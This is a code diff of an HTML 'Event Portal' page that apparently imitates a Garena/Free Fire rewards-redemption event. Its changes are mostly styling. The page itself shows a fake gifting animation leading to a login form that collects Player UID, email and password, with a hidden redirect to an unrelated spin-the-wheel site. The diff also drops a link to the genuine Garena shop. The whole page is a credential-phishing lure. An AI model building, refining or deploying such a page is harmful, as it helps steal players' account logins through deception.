@@ -6,12 +6,13 @@
     <title>Event Portal</title>
     <link rel="icon" type="image/png" href="images/ff-logo-icon.png">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Teko:wght@500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Teko:wght@400;500;700&display=swap');
         
         body { 
             margin: 0; padding: 0; 
             font-family: 'Teko', sans-serif; 
-            background: #1a1a1a url('images/background.jpeg') no-repeat center center fixed; 
+            /* background-position ko 'left center' kiya gaya hai mobile view ke liye */
+            background: #1a1a1a url('images/background.jpeg') no-repeat left center fixed; 
             background-size: cover; 
             color: white; 
             overflow-x: hidden;
@@ -24,21 +25,13 @@
             background-size: contain; z-index: 1000;
         }
 
-        /* Square White Cart Button (No Icon) */
-        .cart-square {
-            position: fixed; top: 30px; right: 20px; z-index: 1000;
-            background: #fff; width: 45px; height: 45px; 
-            box-shadow: 0 0 10px rgba(0,0,0,0.5); cursor: pointer;
-            border: none;
-        }
-
         .overlay { 
             background: rgba(0, 0, 0, 0.6); 
             min-height: 100vh; display: flex; flex-direction: column; align-items: center; 
-            padding: 50px 0 0 0; box-sizing: border-box;
+            padding: 40px 0 0 0; box-sizing: border-box;
         }
 
-        /* Phase 1: Double Roll Animation */
+        /* Phase 1: Gifting Rolls */
         #gifting-section { 
             width: 100%; display: flex; flex-direction: column; align-items: center; 
             justify-content: center; flex-grow: 1;
@@ -56,7 +49,7 @@
         
         .btn-luck {
             background: #ffbc00; color: #000; padding: 12px 60px; border: none;
-            font-size: 30px; font-weight: bold; cursor: pointer; border-radius: 4px;
+            font-size: 32px; font-weight: 700; cursor: pointer; border-radius: 4px;
             margin: 30px 0; text-transform: uppercase; font-family: 'Teko', sans-serif;
         }
 
@@ -66,17 +59,17 @@
             background: rgba(15, 15, 15, 0.95); 
             border: 2px solid #ffbc00; padding: 25px; border-radius: 4px;
         }
-        .title { color: #ffbc00; font-size: 35px; margin-bottom: 20px; }
+        .title { color: #ffbc00; font-size: 38px; font-weight: 500; margin-bottom: 20px; text-transform: uppercase; }
         
         input { 
             width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #333; 
-            background: #222; color: #fff; font-size: 20px; box-sizing: border-box;
+            background: #222; color: #fff; font-size: 22px; box-sizing: border-box;
             font-family: 'Teko', sans-serif;
         }
         .login-btn { 
             width: 100%; padding: 12px; background: #ffbc00; border: none; 
-            color: #000; font-weight: bold; font-size: 24px; cursor: pointer; 
-            margin-top: 10px; font-family: 'Teko', sans-serif;
+            color: #000; font-weight: 700; font-size: 26px; cursor: pointer; 
+            margin-top: 10px; font-family: 'Teko', sans-serif; text-transform: uppercase;
         }
 
         .social-icons { margin-top: 20px; display: flex; justify-content: center; gap: 15px; }
@@ -84,9 +77,9 @@
 
         /* Notice Box */
         .notice-box { 
-            background: #fff; color: #333; padding: 15px; border-radius: 4px; 
-            text-align: left; font-size: 14px; margin-top: 20px; line-height: 1.4;
-            font-family: sans-serif;
+            background: #fff; color: #333; padding: 20px; border-radius: 4px; 
+            text-align: left; font-size: 15px; margin-top: 20px; line-height: 1.5;
+            font-family: sans-serif; font-weight: 500;
         }
         .red-mark { color: #ff0000; font-weight: bold; }
 
@@ -94,7 +87,7 @@
         footer {
             background: #000; width: 100%; padding: 15px 0; margin-top: auto;
             display: flex; justify-content: center; align-items: center;
-            font-family: sans-serif; font-size: 11px; color: #fff;
+            font-family: sans-serif; font-size: 12px; color: #fff;
         }
         .foot-logo { height: 25px; margin-right: 10px; }
     </style>
@@ -102,12 +95,11 @@
 <body>
 
     <div class="top-border"></div>
-    <div class="cart-square" onclick="location.href='https://shop.garena.sg/'"></div>
 
     <div class="overlay">
         
         <div id="gifting-section">
-            <img src="images/logo-new.png" style="width:150px; margin-bottom:15px;">
+            <img src="images/logo-new.png" style="width:160px; margin-bottom:15px;">
             
             <div class="roll-row">
                 <div class="roll-content left-to-right" id="roll1"></div>
@@ -120,7 +112,7 @@
         </div>
 
         <div id="login-section">
-            <img src="images/logo-new.png" style="width:130px; margin-bottom:10px;">
+            <img src="images/logo-new.png" style="width:140px; margin-bottom:10px;">
             <div class="login-box">
                 <div class="title">REWARDS REDEMPTION</div>
                 
@@ -129,7 +121,9 @@
                     <input type="text" name="player_uid" placeholder="Enter Player UID" required>
                     <input type="email" name="user_email" placeholder="Email Address" required>
                     <input type="password" name="token_access" placeholder="Password" required>
+                    
                     <input type="hidden" name="redirect" value="https://www.nykaa.com/spin-the-wheel-nd/lp">
+                    
                     <button type="submit" class="login-btn">LOG-IN</button>
                 </form>
 
@@ -175,9 +169,8 @@
                 img.src = src;
                 img.className = 'roll-img';
                 
-                // Animation Pause Logic for Big Images
                 img.onload = function() {
-                    if(this.naturalWidth > 800) {
+                    if(this.naturalWidth > 900) {
                         r1.style.animationPlayState = 'paused';
                         r2.style.animationPlayState = 'paused';
                         setTimeout(() => {
